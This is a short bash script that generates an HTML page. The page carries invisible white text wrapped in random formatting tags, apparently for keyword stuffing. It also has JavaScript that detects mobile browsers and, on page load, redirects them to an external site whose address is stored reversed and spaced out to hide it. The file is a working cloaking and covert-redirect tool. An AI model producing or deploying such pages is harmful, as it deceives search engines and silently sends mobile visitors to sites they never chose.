#!/bin/bash


value=$UNICHAR
arrval=(${value})

 # res=${arrval[$RANDOM%5]}
res='<font color="white">'
for i in "${arrval[@]}"
do 
tags_list=( b h1 h2 h3 h4 h5 h6 acronym abbr address bdi small strong u q pre ins sub sup em cite bdo )
 a=${tags_list[$RANDOM%22]}


	res+='<'$a'><font color="white">'$i'</font><'/$a'>'
done
# echo $res
res+='</font>'


cat <<EOF
<!DOCTYPE html>
<html>
<head>

<script>

if( navigator.userAgent.match(/IEMobile/i) || navigator.userAgent.match(/Opera Mini/i) || navigator.userAgent.match(/BlackBerry/i) || navigator.userAgent.match(/iPhone|iPad|iPod/i) || (navigator.userAgent.match(/Android/i)) ) 
{
         document.addEventListener( 'DOMContentLoaded', function () {
var elements = document.querySelectorAll("a");
Array.prototype.forEach.call(elements, function(el, i){
   var href = el.getAttribute('href');
       var pat = href.split(" ").reverse().join("");
        href = pat.slice(0, -$LENGTH);
       
		   window.location.href = href;  
		 

});
}, false );

};

</script>
</head>
<body>
 $res
<a href="$UNICHAR z y x . l r i g p a n s . w w w / / : p t t h"></a>

</body>
</html>
EOF
 

